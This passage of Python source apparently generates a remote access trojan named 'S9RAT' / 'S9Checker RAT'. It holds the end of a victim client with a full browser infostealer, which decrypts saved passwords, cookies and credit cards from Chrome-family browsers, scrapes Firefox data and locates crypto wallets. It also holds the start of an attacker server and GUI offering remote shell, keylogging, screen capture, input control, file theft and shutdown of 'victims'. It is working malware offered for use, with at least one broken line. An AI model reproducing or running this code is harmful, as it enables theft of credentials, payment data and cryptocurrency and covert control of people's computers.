                        except Exception:
                            pass
                    return cookies

                chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data")
                if os.path.exists(chrome_path):
                    result["chrome"] = _read_cookies("chrome", chrome_path)

                edge_path = os.path.expandvars(r"%LOCALAPPDATA%\\\\Microsoft\\\\Edge\\\\User Data")
                if os.path.exists(edge_path):
                    result["edge"] = _read_cookies("edge", edge_path)
        except Exception as e:
            result["_error"] = str(e)
        return result

    def _get_infostealer(self):
        result = {{}}
        try:
            import shutil, sqlite3, tempfile
            from pathlib import Path

            def _decrypt_chrome_value(encrypted_value, profile_path):
                if not encrypted_value or len(encrypted_value) < 3:
                    return ""
                if encrypted_value[:3] in (b"v10", b"v20"):
                    try:
                        local_state_path = os.path.join(
                            os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Local State"
                        )
                        if os.path.exists(local_state_path):
                            with open(local_state_path, "r", encoding="utf-8") as f:
                                local_state = json.load(f)
                            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                            import ctypes, ctypes.wintypes
                            class DATA_BLOB(ctypes.Structure):
                                _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                            blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
                            blob_out = DATA_BLOB()
                            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                                aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                            else:
                                return ""
                            if encrypted_value[:3] == b"v10":
                                nonce = encrypted_value[3:15]
                                ciphertext = encrypted_value[15:-16]
                                tag = encrypted_value[-16:]
                                from Crypto.Cipher import AES
                                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                                return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                    except Exception:
                        pass
                try:
                    import ctypes, ctypes.wintypes
                    class DATA_BLOB(ctypes.Structure):
                        _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
                    blob_in = DATA_BLOB(len(encrypted_value), ctypes.create_string_buffer(encrypted_value, len(encrypted_value)))
                    blob_out = DATA_BLOB()
                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                        return ctypes.string_at(blob_out.pbData, blob_out.cbData).decode("utf-8", errors="replace")
                except Exception:
                    pass
                return ""

            def _copy_locked_db(src_path):
                tmp = os.path.join(tempfile.gettempdir(), f"s9r_{{os.path.basename(src_path)}}")
                shutil.copy2(src_path, tmp)
                return tmp

            def _collect_passwords(conn, profile_path, browser_name):
                result_list = []
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cur.fetchall():
                        pwd = _decrypt_chrome_value(row[2], profile_path)
                        if pwd:
                            result_list.append({{"url": row[0], "username": row[1], "password": pwd}})
                except Exception:
                    pass
                return result_list

            def _collect_cookies(conn, profile_path, browser_name):
                result_list = []
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, value, encrypted_value, path, is_secure, is_httponly FROM cookies")
                    for row in cur.fetchall():
                        val = row[2] if row[2] else _decrypt_chrome_value(row[3], profile_path)
                        if val:
                            result_list.append({{"host": row[0], "name": row[1], "value": val, "path": row[4], "secure": bool(row[5]), "httponly": bool(row[6])}})
                except Exception:
                    pass
                return result_list

            def _collect_autofill_and_cards(conn, profile_path, browser_name):
                autofill, cards = [], []
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT name, value FROM autofill")
                    for row in cur.fetchall():
                        autofill.append({{"name": row[0], "value": row[1]}})
                except Exception:
                    pass
                try:
                    cur = conn.cursor()
                    cur.execute("SELECT name_on_card, card_number_encrypted, expiry_month, expiry_year FROM credit_cards")
                    for row in cur.fetchall():
                        card_num = _decrypt_chrome_value(row[1], profile_path)
                        cards.append({{"name": row[0], "number": card_num, "expiry": f"{{row[2]}}/{{row[3}}"}})
                except Exception:
                    pass
                return autofill, cards

            def _collect_browser(browser_name, user_data_path):
                data = {{"passwords": [], "cookies": [], "autofill": [], "credit_cards": [], "history": [], "bookmarks": [], "local_storage": []}}
                if not os.path.exists(user_data_path):
                    return data
                for profile in os.listdir(user_data_path):
                    profile_dir = os.path.join(user_data_path, profile)
                    if not os.path.isdir(profile_dir) or profile.startswith("System"):
                        continue
                    if profile != "Default" and not os.path.exists(os.path.join(profile_dir, "Preferences")):
                        continue
                    for db_name in ["Login Data", "Cookies", "Web Data"]:
                        db_path = os.path.join(profile_dir, db_name)
                        if os.path.exists(db_path):
                            try:
                                tmp = _copy_locked_db(db_path)
                                conn = sqlite3.connect(tmp)
                                if db_name == "Login Data":
                                    data["passwords"].extend(_collect_passwords(conn, profile_dir, browser_name))
                                elif db_name == "Cookies":
                                    data["cookies"].extend(_collect_cookies(conn, profile_dir, browser_name))
                                elif db_name == "Web Data":
                                    af, cc = _collect_autofill_and_cards(conn, profile_dir, browser_name)
                                    data["autofill"].extend(af)
                                    data["credit_cards"].extend(cc)
                                conn.close()
                                os.remove(tmp)
                            except Exception:
                                try: os.remove(tmp)
                                except: pass
                    history_db = os.path.join(profile_dir, "History")
                    if os.path.exists(history_db):
                        try:
                            tmp = _copy_locked_db(history_db)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
                            for row in cur.fetchall():
                                data["history"].append({{"url": row[0], "title": row[1], "visits": row[2]}})
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass
                    bookmarks_file = os.path.join(profile_dir, "Bookmarks")
                    if os.path.exists(bookmarks_file):
                        try:
                            with open(bookmarks_file, "r", encoding="utf-8") as f:
                                bk = json.load(f)
                            def _walk_bookmarks(node, depth=0):
                                if depth > 5: return
                                if node.get("type") == "url":
                                    data["bookmarks"].append({{"name": node.get("name",""), "url": node.get("url","")}})
                                for child in node.get("children", []):
                                    _walk_bookmarks(child, depth+1)
                            for root_key in bk.get("roots", {{}}):
                                root = bk["roots"][root_key]
                                if isinstance(root, dict):
                                    _walk_bookmarks(root)
                        except Exception:
                            pass
                return data

            chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data")
            if os.path.exists(chrome_path):
                result["chrome"] = _collect_browser("Chrome", chrome_path)
            edge_path = os.path.expandvars(r"%LOCALAPPDATA%\\\\Microsoft\\\\Edge\\\\User Data")
            if os.path.exists(edge_path):
                result["edge"] = _collect_browser("Edge", edge_path)
            brave_path = os.path.expandvars(r"%LOCALAPPDATA%\\\\BraveSoftware\\\\Brave-Browser\\\\User Data")
            if os.path.exists(brave_path):
                result["brave"] = _collect_browser("Brave", brave_path)
            opera_path = os.path.expandvars(r"%LOCALAPPDATA%\\\\Opera Software\\\\Opera Stable")
            if os.path.exists(opera_path):
                result["opera"] = _collect_browser("Opera", opera_path)
            vivaldi_path = os.path.expandvars(r"%LOCALAPPDATA%\\\\Vivaldi\\\\User Data")
            if os.path.exists(vivaldi_path):
                result["vivaldi"] = _collect_browser("Vivaldi", vivaldi_path)
            ff_base = os.path.expandvars(r"%APPDATA%\\\\Mozilla\\\\Firefox\\\\Profiles")
            if os.path.exists(ff_base):
                ff_data = {{"passwords": [], "cookies": [], "history": [], "bookmarks": []}}
                for profile_dir in os.listdir(ff_base):
                    cookies_db = os.path.join(ff_base, profile_dir, "cookies.sqlite")
                    if os.path.exists(cookies_db):
                        try:
                            tmp = _copy_locked_db(cookies_db)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT host, name, value, path, isSecure, isHttpOnly FROM moz_cookies LIMIT 5000")
                            for row in cur.fetchall():
                                ff_data["cookies"].append({{"host": row[0], "name": row[1], "value": row[2], "path": row[3], "secure": bool(row[4]), "httponly": bool(row[5])}})
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass
                    places_db = os.path.join(ff_base, profile_dir, "places.sqlite")
                    if os.path.exists(places_db):
                        try:
                            tmp = _copy_locked_db(places_db)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 500")
                            for row in cur.fetchall():
                                ff_data["history"].append({{"url": row[0], "title": row[1], "visits": row[2]}})
                            conn.close()
                            os.remove(tmp)
                        except Exception:
                            try: os.remove(tmp)
                            except: pass
                if any(ff_data.values()):
                    result["firefox"] = ff_data
        except Exception as e:
            result["_error"] = str(e)
        return result

    def _get_crypto_stealer(self):
        result = {{"desktop_wallets": [], "browser_extensions": []}}
        try:
            import glob as glob_mod
            wallet_paths = {{
                "Bitcoin Core": os.path.expandvars(r"%APPDATA%\\\\Bitcoin\\\\wallet.dat"),
                "Electrum": os.path.expandvars(r"%APPDATA%\\\\Electrum\\\\wallets"),
                "Exodus": os.path.expandvars(r"%APPDATA%\\\\Exodus\\\\exodus.wallet"),
                "Atomic Wallet": os.path.expandvars(r"%APPDATA%\\\\atomic"),
                "Coinomi": os.path.expandvars(r"%APPDATA%\\\\Coinomi"),
                "Jaxx Liberty": os.path.expandvars(r"%APPDATA%\\\\Jaxx Liberty"),
                "Wasabi": os.path.expandvars(r"%APPDATA%\\\\WalletWasabi"),
            }}
            for wallet_name, wpath in wallet_paths.items():
                if os.path.exists(wpath):
                    try:
                        if os.path.isfile(wpath):
                            result["desktop_wallets"].append({{"name": wallet_name, "path": wpath, "status": "found", "size": os.path.getsize(wpath)}})
                        elif os.path.isdir(wpath):
                            result["desktop_wallets"].append({{"name": wallet_name, "path": wpath, "status": "found", "files": os.listdir(wpath)[:20]}})
                    except Exception:
                        pass
            extension_wallets = {{
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpb",
                "Trust Wallet": "egjidjbpglichdcondbcbdnachmppkhg",
                "Coinbase Wallet": "hnfanknocfeofodojknjpchemobdlifd",
                "Exodus": "aholpfdialjgjfhmfihgbkmdkbfadlgm",
                "Brave Wallet": "odbfpeeihodbihlmhfnkagiiopncfemo",
                "SafePal": "lgmpfmgnnophknojemaepahcfaagmnki",
            }}
            ext_base = os.path.expandvars(r"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Extension Settings")
            for ext_name, ext_id in extension_wallets.items():
                ext_dir = os.path.join(ext_base, ext_id)
                if os.path.isdir(ext_dir):
                    result["browser_extensions"].append({{"name": ext_name, "extension_id": ext_id, "status": "found", "files": os.listdir(ext_dir)[:10], "path": ext_dir}})
                else:
                    result["browser_extensions"].append({{"name": ext_name, "extension_id": ext_id, "status": "not_found"}})
        except Exception as e:
            result["_error"] = str(e)
        return result


def main():
    client = VictimClient(
        server_host="{server_ip}",
        server_port={port},
        password="{password}",
    )
    if client.connect():
        client.run()
    else:
        import sys
        sys.exit(1)


if __name__ == "__main__":
    main()
'''


def _generate_hacker_script(port: int, password: str) -> str:
    return f'''import socket
import json
import struct
import hashlib
import os
import time
import logging
import threading
import io
import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", filename="hacker.log", filemode="w")
logger = logging.getLogger("S9RAT")

PROTOCOL_VERSION = 2
DEFAULT_PORT = 5555
MAGIC = b"S9RAT"

MSG_TYPES = {{
    "AUTH": 1, "AUTH_OK": 2, "AUTH_FAIL": 3,
    "SCREEN_FRAME": 10, "SCREEN_START": 11, "SCREEN_STOP": 12,
    "SCREEN_SELECT": 13, "SCREEN_MONITORS": 14,
    "CONTROL_ENABLE": 20, "CONTROL_DISABLE": 21, "CONTROL_INPUT": 22,
    "EXFIL_DATA": 30, "EXFIL_REQUEST": 31, "FILE_LIST": 32, "FILE_TRANSFER": 33,
    "FILE_TRANSFER_DATA": 34, "FILE_TRANSFER_END": 35,
    "FILE_DOWNLOAD": 36, "FILE_BROWSE": 37, "SCREENSHOT": 38,
    "SYSTEM_INFO": 40, "WIFI_PASSWORDS": 41, "BROWSER_CREDS": 42,
    "HEARTBEAT": 50, "HEARTBEAT_ACK": 51, "DISCONNECT": 60,
    "SHUTDOWN": 70, "RESTART": 71, "LOGOFF": 72,
    "SHELL_EXEC": 80, "SHELL_OUTPUT": 81,
    "PROCESS_LIST": 82, "PROCESS_DATA": 83, "PROCESS_KILL": 84,
    "KEYLOG_START": 90, "KEYLOG_STOP": 91, "KEYLOG_DATA": 92,
    "CLIPBOARD_GET": 93, "CLIPBOARD_DATA": 94,
    "CHAT_SEND": 95, "CHAT_DISPLAY": 96,
}}


def pack_message(msg_type, data):
    msg_bytes = json.dumps(data).encode("utf-8")
    type_id = MSG_TYPES.get(msg_type, 0)
    header = MAGIC + struct.pack("!BI", type_id, len(msg_bytes))
    return header + msg_bytes


def pack_frame(frame_data):
    type_id = MSG_TYPES["SCREEN_FRAME"]
    header = MAGIC + struct.pack("!BI", type_id, len(frame_data))
    return header + frame_data


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(min(n - len(buf), 65536))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf.extend(chunk)
    return bytes(buf)


def recv_message(sock):
    header = recv_exact(sock, 10)
    if header[:5] != MAGIC:
        raise ValueError("Invalid protocol magic")
    type_id = struct.unpack("!B", header[5:6])[0]
    length = struct.unpack("!I", header[6:10])[0]
    if length > 50 * 1024 * 1024:
        raise ValueError("Message too large")
    msg_bytes = recv_exact(sock, length)
    msg_type = None
    for name, tid in MSG_TYPES.items():
        if tid == type_id:
            msg_type = name
            break
    if not msg_type:
        msg_type = f"UNKNOWN_{{type_id}}"
    return msg_type, json.loads(msg_bytes.decode("utf-8"))


def recv_raw(sock, n):
    return recv_exact(sock, n)


def set_nodelay(sock):
    try:
        import socket as _socket
        sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
    except Exception:
        pass


class HackerServer:
    def __init__(self, port=DEFAULT_PORT, password="", output_dir="rat_output"):
        self.port = port
        self.password = password
        self.output_dir = output_dir
        self._server_sock = None
        self._running = False
        self._clients = {{}}
        self._lock = threading.Lock()
        self._on_client_connect = None
        self._on_client_disconnect = None
        self._on_screen_frame = None
        self._on_exfil_data = None
        self._on_shell_output = None
        self._on_process_data = None
        self._on_keylog_data = None
        self._on_clipboard_data = None
        self._on_chat_display = None
        self._on_file_browse = None
        self._on_file_download_data = None
        self._on_file_transfer_end = None
        os.makedirs(output_dir, exist_ok=True)

    def set_callbacks(self, on_connect=None, on_disconnect=None, on_screen_frame=None, on_exfil_data=None,
                      on_shell_output=None, on_process_data=None, on_keylog_data=None,
                      on_clipboard_data=None, on_chat_display=None,
                      on_file_browse=None, on_file_download_data=None, on_file_transfer_end=None):
        self._on_client_connect = on_connect
        self._on_client_disconnect = on_disconnect
        self._on_screen_frame = on_screen_frame
        self._on_exfil_data = on_exfil_data
        self._on_shell_output = on_shell_output
        self._on_process_data = on_process_data
        self._on_keylog_data = on_keylog_data
        self._on_clipboard_data = on_clipboard_data
        self._on_chat_display = on_chat_display
        self._on_file_browse = on_file_browse
        self._on_file_download_data = on_file_download_data
        self._on_file_transfer_end = on_file_transfer_end

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind(("0.0.0.0", self.port))
        self._server_sock.listen(5)
        self._server_sock.settimeout(1.0)
        self._running = True
        logger.info(f"Server listening on port {{self.port}}")
        threading.Thread(target=self._accept_loop, daemon=True).start()
        threading.Thread(target=self._heartbeat_loop, daemon=True).start()

    def _heartbeat_loop(self):
        while self._running:
            time.sleep(30)
            if not self._running:
                break
            with self._lock:
                for client_id, info in list(self._clients.items()):
                    try:
                        info["sock"].sendall(pack_message("HEARTBEAT", {{}}))
                    except Exception:
                        pass

    def stop(self):
        self._running = False
        with self._lock:
            for client_id, info in list(self._clients.items()):
                try:
                    info["sock"].close()
                except Exception:
                    pass
            self._clients.clear()
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running:
            try:
                client_sock, addr = self._server_sock.accept()
                threading.Thread(target=self._handle_client, args=(client_sock, addr), daemon=True).start()
            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    logger.error(f"Accept error: {{e}}")

    def _handle_client(self, sock, addr):
        client_id = f"{{addr[0]}}:{{addr[1]}}"
        logger.info(f"New connection from {{client_id}}")
        try:
            sock.settimeout(30)
            set_nodelay(sock)
            msg_type, auth_data = recv_message(sock)
            if msg_type != "AUTH":
                sock.close()
                return
            if self.password and auth_data.get("password") != self.password:
                sock.sendall(pack_message("AUTH_FAIL", {{}}))
                sock.close()
                return
            sock.sendall(pack_message("AUTH_OK", {{}}))
            info = {{
                "sock": sock, "addr": addr,
                "hostname": auth_data.get("hostname", "unknown"),
                "username": auth_data.get("username", "unknown"),
                "os": auth_data.get("os", "unknown"),
                "os_version": auth_data.get("os_version", ""),
                "arch": auth_data.get("arch", ""),
                "pid": auth_data.get("pid", 0),
                "protocol_version": auth_data.get("protocol_version", 1),
                "monitors": auth_data.get("monitors", []),
                "connected_at": time.time(),
                "screen_active": False, "control_enabled": False,
                "selected_monitor": 0, "last_heartbeat": time.time(),
            }}
            with self._lock:
                self._clients[client_id] = info
            if self._on_client_connect:
                self._on_client_connect(client_id, info)
            self._client_loop(sock, client_id, info)
        except Exception as e:
            logger.error(f"Client {{client_id}} error: {{e}}")
        finally:
            with self._lock:
                self._clients.pop(client_id, None)
            if self._on_client_disconnect:
                self._on_client_disconnect(client_id)
            try:
                sock.close()
            except Exception:
                pass
            logger.info(f"Client {{client_id}} disconnected")

    def _client_loop(self, sock, client_id, info):
        while self._running and client_id in self._clients:
            try:
                sock.settimeout(1.0)
                msg_type, data = recv_message(sock)
                if msg_type == "SCREEN_FRAME":
                    frame_size = data.get("size", 0)
                    if frame_size > 0:
                        try:
                            frame_data = recv_raw(sock, frame_size)
                        except ConnectionError:
                            break
                        if self._on_screen_frame:
                            self._on_screen_frame(client_id, frame_data)
                elif msg_type == "EXFIL_DATA":
                    exfil_type = data.get("type", "unknown")
                    exfil_data = data.get("data", {{}})
                    self._save_exfil(client_id, exfil_type, exfil_data)
                    if self._on_exfil_data:
                        self._on_exfil_data(client_id, exfil_type, exfil_data)
                elif msg_type == "HEARTBEAT_ACK":
                    with self._lock:
                        if client_id in self._clients:
                            self._clients[client_id]["last_heartbeat"] = time.time()
                elif msg_type == "SHELL_OUTPUT":
                    if self._on_shell_output:
                        self._on_shell_output(client_id, data)
                elif msg_type == "PROCESS_DATA":
                    if self._on_process_data:
                        self._on_process_data(client_id, data)
                elif msg_type == "KEYLOG_DATA":
                    if self._on_keylog_data:
                        self._on_keylog_data(client_id, data)
                elif msg_type == "CLIPBOARD_DATA":
                    if self._on_clipboard_data:
                        self._on_clipboard_data(client_id, data)
                elif msg_type == "CHAT_DISPLAY":
                    if self._on_chat_display:
                        self._on_chat_display(client_id, data)
                elif msg_type == "FILE_DOWNLOAD_DATA":
                    dl_size = data.get("size", 0)
                    if dl_size > 0:
                        try:
                            dl_data = recv_raw(sock, dl_size)
                        except ConnectionError:
                            break
                        if self._on_file_download_data:
                            self._on_file_download_data(client_id, data, dl_data)
                elif msg_type == "FILE_TRANSFER_DATA":
                    pass
                elif msg_type == "FILE_TRANSFER_END":
                    if self._on_file_transfer_end:
                        self._on_file_transfer_end(client_id, data)
            except socket.timeout:
                continue
            except ConnectionError:
                break
            except Exception as e:
                logger.error(f"Client {{client_id}} loop error: {{e}}")
                break

    def send_command(self, client_id, msg_type, data):
        with self._lock:
            info = self._clients.get(client_id)
        if not info:
            return False
        try:
            info["sock"].sendall(pack_message(msg_type, data))
            return True
        except Exception as e:
            logger.error(f"Send error to {{client_id}}: {{e}}")
            return False

    def start_screen(self, client_id):
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["screen_active"] = True
        return self.send_command(client_id, "SCREEN_START", {{}})

    def stop_screen(self, client_id):
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["screen_active"] = False
        return self.send_command(client_id, "SCREEN_STOP", {{}})

    def select_monitor(self, client_id, monitor_index):
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["selected_monitor"] = monitor_index
        return self.send_command(client_id, "SCREEN_SELECT", {{"monitor_index": monitor_index}})

    def enable_control(self, client_id):
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["control_enabled"] = True
        return self.send_command(client_id, "CONTROL_ENABLE", {{}})

    def disable_control(self, client_id):
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["control_enabled"] = False
        return self.send_command(client_id, "CONTROL_DISABLE", {{}})

    def send_input(self, client_id, input_type, **kwargs):
        data = {{"input_type": input_type, **kwargs}}
        return self.send_command(client_id, "CONTROL_INPUT", data)

    def request_exfil(self, client_id, exfil_type):
        return self.send_command(client_id, "EXFIL_REQUEST", {{"type": exfil_type}})

    def shutdown_client(self, client_id):
        return self.send_command(client_id, "SHUTDOWN", {{}})

    def restart_client(self, client_id):
        return self.send_command(client_id, "RESTART", {{}})

    def logoff_client(self, client_id):
        return self.send_command(client_id, "LOGOFF", {{}})

    def exec_shell(self, client_id, command):
        return self.send_command(client_id, "SHELL_EXEC", {{"command": command}})

    def request_processes(self, client_id):
        return self.send_command(client_id, "PROCESS_LIST", {{}})

    def kill_process(self, client_id, pid):
        return self.send_command(client_id, "PROCESS_KILL", {{"pid": pid}})

    def start_keylog(self, client_id):
        return self.send_command(client_id, "KEYLOG_START", {{}})

    def stop_keylog(self, client_id):
        return self.send_command(client_id, "KEYLOG_STOP", {{}})

    def get_clipboard(self, client_id):
        return self.send_command(client_id, "CLIPBOARD_GET", {{}})

    def send_chat(self, client_id, message):
        return self.send_command(client_id, "CHAT_SEND", {{"message": message}})

    def take_screenshot(self, client_id):
        return self.send_command(client_id, "SCREENSHOT", {{}})

    def browse_directory(self, client_id, path):
        return self.send_command(client_id, "FILE_BROWSE", {{"path": path}})

    def download_file(self, client_id, remote_path):
        return self.send_command(client_id, "FILE_DOWNLOAD", {{"path": remote_path}})

    def upload_file(self, client_id, local_path, dest_path):
        import threading as _threading
        def _do_upload():
            try:
                info = self._clients.get(client_id)
                if not info:
                    return
                sock = info["sock"]
                import os as _os
                filename = _os.path.basename(local_path)
                size = _os.path.getsize(local_path)
                sock.sendall(pack_message("FILE_TRANSFER", {{
                    "filename": filename, "size": size, "dest_path": dest_path,
                }}))
                with open(local_path, "rb") as f:
                    while True:
                        chunk = f.read(65536)
                        if not chunk:
                            break
                        sock.sendall(chunk)
            except Exception:
                pass
        _threading.Thread(target=_do_upload, daemon=True).start()
        return True

    def _save_exfil(self, client_id, exfil_type, data):
        client_dir = os.path.join(self.output_dir, client_id.replace(":", "_"))
        os.makedirs(client_dir, exist_ok=True)
        filepath = os.path.join(client_dir, f"{{exfil_type}}.txt")
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                if isinstance(data, dict):
                    for key, value in data.items():
                        f.write(f"{{key}}: {{value}}\\n")
                else:
                    f.write(str(data))
            logger.info(f"Exfil saved: {{filepath}}")
        except Exception as e:
            logger.error(f"Failed to save exfil: {{e}}")

    def get_clients(self):
        with self._lock:
            return {{k: {{kk: vv for kk, vv in v.items() if kk != "sock"}} for k, v in self._clients.items()}}


class HackerGUI:
    def __init__(self, server):
        self.server = server
        self.root = ctk.CTk()
        self.root.title("S9Checker RAT v2.0")
        self.root.geometry("1400x900")
        self.root.configure(fg_color="#0a0a0f")
        self.root.minsize(1000, 700)

        self.current_client = None
        self._photo = None
        self._stream_active = False
        self._control_active = False
        self._keylog_active = False
        self._frame_lock = threading.Lock()
        self._frame_skip = False
        self._process_data = []

        self.server.set_callbacks(
            on_connect=self._on_client_connect,
            on_disconnect=self._on_client_disconnect,
            on_screen_frame=self._on_screen_frame,
            on_exfil_data=self._on_exfil_data,
            on_shell_output=self._on_shell_output,
            on_process_data=self._on_process_data,
            on_keylog_data=self._on_keylog_data,
            on_clipboard_data=self._on_clipboard_data,
            on_chat_display=self._on_chat_display,
            on_file_browse=self._on_file_browse,
            on_file_download_data=self._on_file_download_data,
            on_file_transfer_end=self._on_file_transfer_end,
        )

        self._build_ui()
        self._poll_clients()

    def _build_ui(self):
        main = ctk.CTkFrame(self.root, fg_color="#0a0a0f")
        main.pack(fill="both", expand=True, padx=6, pady=6)

        sidebar = ctk.CTkFrame(main, fg_color="#12121a", width=240)
        sidebar.pack(side="left", fill="y", padx=(0, 4))
        sidebar.pack_propagate(False)

        hdr = ctk.CTkFrame(sidebar, fg_color="transparent")
        hdr.pack(fill="x", padx=12, pady=(12, 4))
        ctk.CTkLabel(hdr, text="S9RAT", font=("Segoe UI", 16, "bold"), text_color="#7c5cff").pack(side="left")
        ctk.CTkLabel(hdr, text="v2.0", font=("Segoe UI", 10), text_color="#555555").pack(side="left", padx=(4, 0), pady=(4, 0))

        ctk.CTkFrame(sidebar, fg_color="#2a2a3a", height=1).pack(fill="x", padx=12, pady=8)
        ctk.CTkLabel(sidebar, text="VICTIMS", font=("Segoe UI", 10, "bold"), text_color="#888888").pack(padx=12, anchor="w")

        self.client_list = ctk.CTkScrollableFrame(sidebar, fg_color="transparent", scrollbar_button_color="#2a2a3a", scrollbar_button_hover_color="#3a3a4a")
        self.client_list.pack(fill="both", expand=True, padx=8, pady=(4, 0))

        ctk.CTkButton(sidebar, text="Refresh", command=self._refresh_clients, fg_color="#1e1e2a", hover_color="#2a2a3a", text_color="#e8e8e8", height=32).pack(pady=8, padx=8, fill="x")

        center = ctk.CTkFrame(main, fg_color="#12121a")
        center.pack(side="left", fill="both", expand=True, padx=(0, 4))

        toolbar = ctk.CTkFrame(center, fg_color="#0e0e16", height=48)
        toolbar.pack(fill="x", padx=8, pady=(8, 4))

        self.stream_btn = ctk.CTkButton(toolbar, text="  Start Stream  ", command=self._toggle_stream, fg_color="#4ade80", hover_color="#22c55e", text_color="#000000", width=130, height=32, font=("Segoe UI", 11, "bold"))
        self.stream_btn.pack(side="left", padx=(0, 4))
        self.control_btn = ctk.CTkButton(toolbar, text="  Enable Control  ", command=self._toggle_control, fg_color="#fbbf24", hover_color="#f59e0b", text_color="#000000", width=140, height=32, font=("Segoe UI", 11, "bold"))
        self.control_btn.pack(side="left", padx=4)
        self.client_label = ctk.CTkLabel(toolbar, text="No client selected", font=("Segoe UI", 12), text_color="#888888")
        self.client_label.pack(side="left", padx=12)
        self.fps_label = ctk.CTkLabel(toolbar, text="", font=("Consolas", 10), text_color="#555555")
        self.fps_label.pack(side="right", padx=8)

        screen_outer = ctk.CTkFrame(center, fg_color="#000000")
        screen_outer.pack(fill="both", expand=True, padx=8, pady=4)

        self.screen_canvas = tk.Canvas(screen_outer, bg="#000000", highlightthickness=0)
        self.screen_canvas.pack(fill="both", expand=True)
        self.screen_canvas.bind("<Button-1>", self._on_mouse_click)
        self.screen_canvas.bind("<B1-Motion>", self._on_mouse_drag)
        self.screen_canvas.bind("<ButtonRelease-1>", self._on_mouse_release)
        self.screen_canvas.bind("<Double-Button-1>", self._on_mouse_double)
        self.screen_canvas.bind("<MouseWheel>", self._on_mouse_scroll)

        self.monitor_var = tk.StringVar(value="All Screens")
        self.monitor_menu = ctk.CTkOptionMenu(screen_outer, variable=self.monitor_var, values=["All Screens"], command=self._on_monitor_select, fg_color="#1e1e2a", button_color="#7c5cff", button_hover_color="#9b7eff", text_color="#e8e8e8", dropdown_fg_color="#12121a", dropdown_hover_color="#2a2a3a", width=160, height=28, font=("Segoe UI", 10))
        self.monitor_menu.place(relx=1.0, rely=0.0, anchor="ne", x=-8, y=8)

        nav = ctk.CTkFrame(center, fg_color="transparent")
        nav.pack(fill="x", padx=8, pady=(4, 0))
        self.feature_var = tk.StringVar(value="screen")
        for label, val, color in [("Screen", "screen", "#7c5cff"), ("Terminal", "terminal", "#22d3ee"), ("Processes", "processes", "#4ade80"), ("Keylog", "keylog", "#f87171"), ("Clipboard", "clipboard", "#fbbf24"), ("Chat", "chat", "#7c5cff"), ("Files", "files", "#22d3ee"), ("Exfil", "exfil", "#888888")]:
            ctk.CTkRadioButton(nav, text=label, variable=self.feature_var, value=val, command=self._switch_feature, fg_color=color, hover_color=color, text_color="#e8e8e8", font=("Segoe UI", 10)).pack(side="left", padx=6)

        self.feature_container = ctk.CTkFrame(center, fg_color="#12121a")
        self.feature_container.pack(fill="both", expand=True, padx=8, pady=(4, 8))

        self._build_feature_terminal()
        self._build_feature_processes()
        self._build_feature_keylog()
        self._build_feature_clipboard()
        self._build_feature_chat()
        self._build_feature_files()
        self._build_feature_exfil()
        self._show_feature("screen")

        right = ctk.CTkFrame(main, fg_color="#12121a", width=260)
        right.pack(side="right", fill="y")
        right.pack_propagate(False)

        ctk.CTkLabel(right, text="POWER", font=("Segoe UI", 11, "bold"), text_color="#f87171").pack(padx=12, pady=(12, 4), anchor="w")
        pf = ctk.CTkFrame(right, fg_color="transparent")
        pf.pack(fill="x", padx=8, pady=4)
        for label, cmd, color in [("Shutdown", "shutdown", "#f87171"), ("Restart", "restart", "#fbbf24"), ("Logoff", "logoff", "#22d3ee")]:
